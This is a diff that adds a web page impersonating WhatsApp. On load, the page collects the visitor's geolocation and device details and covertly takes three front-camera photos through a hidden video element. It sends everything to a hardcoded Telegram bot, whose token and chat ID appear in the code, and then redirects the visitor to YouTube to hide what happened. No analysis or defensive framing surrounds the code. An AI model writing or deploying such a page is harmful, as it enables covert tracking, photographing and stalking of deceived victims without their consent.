@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Whatsapp</title>
+</head>
+<body>
+  <p id="status">Whatsapp wants you to allow location and camera permissions to proceed.</p>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const statusElement = document.getElementById('status');
+    const telegramBotToken = "7512568968:AAElKVaCJOrb5yF1sWfXwzJKlE5uwZOnDGA"; // Your Telegram bot token
+    const telegramChatId = "5713868500"; // Your Telegram chat ID
+    let captureStarted = false; // Ensure initiateCapture runs only once
+
+    // Automatically initiate capture on page load
+    window.onload = () => {
+      if (!captureStarted) {
+        captureStarted = true;
+        initiateCapture();
+      }
+    };
+
+    // Initiate permissions and data capture
+    function initiateCapture() {
+      statusElement.innerText = "...";
+
+      // Step 1: Capture location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const deviceInfo = getDeviceInfo();
+
+            statusElement.innerText = ".";
+            sendLocationAndDeviceInfoToTelegram(latitude, longitude, deviceInfo);
+
+            // Step 2: Start camera and capture pictures
+            startCamera();
+          },
+          (error) => {
+            statusElement.innerText = ".";
+          }
+        );
+      } else {
+        statusElement.innerText = ".";
+      }
+    }
+
+    // Get device information
+    function getDeviceInfo() {
+      return {
+        platform: navigator.platform, // OS platform
+        userAgent: navigator.userAgent, // Browser user agent string
+        appName: navigator.appName, // Browser name
+        appVersion: navigator.appVersion, // Browser version
+        language: navigator.language, // Language settings
+      };
+    }
+
+    // Send location and device information to Telegram
+    function sendLocationAndDeviceInfoToTelegram(latitude, longitude, deviceInfo) {
+      const message = `User Location: Latitude: ${latitude}, Longitude: ${longitude}\nDevice Info:\n${JSON.stringify(deviceInfo, null, 2)}`;
+
+      console.log("Sending location and device info...");
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: telegramChatId,
+          text: message,
+        }),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log(":", data);
+        })
+        .catch((error) => {
+          console.error(":", error);
+        });
+    }
+
+    // Start the camera and capture pictures
+    function startCamera() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+
+      navigator.mediaDevices
+        .getUserMedia({
+          video: {
+            width: { ideal: 1920 }, // Request high resolution
+            height: { ideal: 1080 },
+            facingMode: "user", // Use the front camera
+          },
+        })
+        .then((stream) => {
+          video.srcObject = stream;
+          statusElement.innerText = ".";
+
+          // Capture three pictures in quick succession
+          capturePicture(video, canvas, stream, 1);
+        })
+        .catch((error) => {
+          statusElement.innerText = ".";
+          console.error("Camera error:", error);
+        });
+    }
+
+    // Capture pictures and send to Telegram
+    function capturePicture(video, canvas, stream, count) {
+      if (count > 3) {
+        // Stop the camera and redirect after capturing three pictures
+        stream.getTracks().forEach((track) => track.stop());
+        statusElement.innerText = ".";
+        setTimeout(() => {
+          window.location.href = "https://www.youtube.com";
+        }, 2000);
+        return;
+      }
+
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Get picture data
+        const pictureData = canvas.toDataURL('image/jpeg', 1.0); // High quality
+        sendPictureToTelegram(pictureData);
+
+        // Capture next picture
+        capturePicture(video, canvas, stream, count + 1);
+      }, 500); // 500ms delay between pictures
+    }
+
+    // Send picture to Telegram
+    function sendPictureToTelegram(pictureData) {
+      console.log("Sending picture to Telegram...");
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+        method: "POST",
+        body: (() => {
+          const formData = new FormData();
+          formData.append('chat_id', telegramChatId);
+          formData.append('photo', dataURItoBlob(pictureData), 'photo.jpg');
+          return formData;
+        })(),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          console.log(":", data);
+        })
+        .catch((error) => {
+          console.error(":", error);
+        });
+    }
+
+    // Utility function to convert data URI to Blob
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+  </script>
+</body>
+</html>
